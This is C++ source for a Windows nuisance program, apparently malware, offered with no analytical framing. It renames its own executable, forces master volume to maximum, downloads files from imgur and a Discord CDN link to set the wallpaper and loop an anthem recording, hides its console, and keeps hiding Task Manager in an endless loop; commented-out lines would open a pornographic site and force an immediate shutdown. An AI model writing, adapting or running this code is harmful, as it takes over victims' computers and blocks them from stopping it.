#include <windows.h>
#include <string>
#include <iostream>
#include <cstdio>
#include <tchar.h>
#include <Wininet.h>
#include <mmdeviceapi.h>
#include <endpointvolume.h>

#include <direct.h>
using namespace std;

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "Urlmon.lib")

const wchar_t* sURL2 = L"https://i.imgur.com/8a9W5Uy.png";
const wchar_t* sURL = L"https://cdn.discordapp.com/attachments/859107754529259601/1160637807195340870/gimn-ukrainyi.wav?ex=65356330&is=6522ee30&hm=6236d1911b7813c3f219a1a3801c0653e8c9dea314d1d303027d60ff3070d86c&";
const wchar_t* dFile = L"snd.wav";

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    LPCSTR lpOperation = "open";
    LPCSTR lpParameters = NULL;
    LPCSTR lpDirectory = NULL;

    INT nShowCmd = SW_SHOWNORMAL; 

    std::srand(static_cast<unsigned int>(std::time(nullptr)));

    int randomValue = std::rand();

    std::string newName = std::to_string(randomValue);

    std::string currentExeName = "TTT.exe";
    int result = rename(currentExeName.c_str(), newName.c_str());

    if (result == 0) {
        std::cout << "Executable name changed to: " << newName << std::endl;
    }
    else {
        std::cerr << "Error changing executable name." << std::endl;
    }

    CoInitialize(NULL);

    IMMDeviceEnumerator* pEnumerator = NULL;
    CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);

    if (pEnumerator != NULL) {
        IMMDevice* pDevice = NULL;
        pEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &pDevice);

        if (pDevice != NULL) {
            IAudioEndpointVolume* pEndpointVolume = NULL;
            pDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL, (void**)&pEndpointVolume);

            if (pEndpointVolume != NULL) {
                pEndpointVolume->SetMasterVolumeLevelScalar(1.0f, NULL);

                pEndpointVolume->Release();
            }

            pDevice->Release();
        }

        pEnumerator->Release();
    }

    CoUninitialize();


    TCHAR buffer[MAX_PATH];

    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"MyAppClass";
    RegisterClass(&wc);

    const char* filenm = "flag.png";

    HWND hwnd = CreateWindow(L"MyAppClass", L"My App", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 400, 200, NULL, NULL, hInstance, NULL);

    if (S_OK == URLDownloadToFile(NULL, sURL2, L"flag.png", 0, NULL))
    {
        std::wcout << L"The file is saved to snd.wav" << std::endl;
        
        TCHAR exePath[MAX_PATH];

        if (GetModuleFileName(NULL, exePath, MAX_PATH) != 0) {
            std::wstring exeDirectory = exePath;
            size_t lastBackslash = exeDirectory.find_last_of(L"\\");
            if (lastBackslash != std::wstring::npos) {
                exeDirectory = exeDirectory.substr(0, lastBackslash);
            }

            std::wstring imagePath = exeDirectory + L"\\flag.png";

            if (SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)imagePath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)) {
                std::wcout << L"Desktop wallpaper set to: " << imagePath << std::endl;
            }
            else {
                DWORD error = GetLastError();
                std::wcerr << L"Error setting desktop wallpaper. Error code: " << error << std::endl;
            }
        }
        else {
            DWORD error = GetLastError();
            std::wcerr << L"Error getting executable path. Error code: " << error << std::endl;
        }
    }
    else
    {
        std::wcout << L"Unable to Download the file." << std::endl;
        return -1;
    }

    if (S_OK == URLDownloadToFile(NULL, sURL, dFile, 0, NULL))
    {
        std::wcout << L"The file is saved to snd.wav" << std::endl;

        PlaySound(dFile, NULL, SND_FILENAME | SND_ASYNC | SND_LOOP);
    }
    else
    {
        std::wcout << L"Unable to Download the file." << std::endl;
        return -1;
    }

    HWND Console;

    Console = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Console, 0);

    while (true) {
        HWND TaskMgr;
        TaskMgr = FindWindowA(NULL, "Task Manager");
        ShowWindow(TaskMgr, 0);

        //ShellExecuteA(NULL, lpOperation, "https://w.gay-porevo.mobi/", lpParameters, lpDirectory, nShowCmd);

        Sleep(50);
    }

    Sleep(10000);
    //ShellExecuteA(NULL, lpOperation, "shutdown", "/s /t 0", lpDirectory, nShowCmd);

    MSG msg = { 0 };
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}
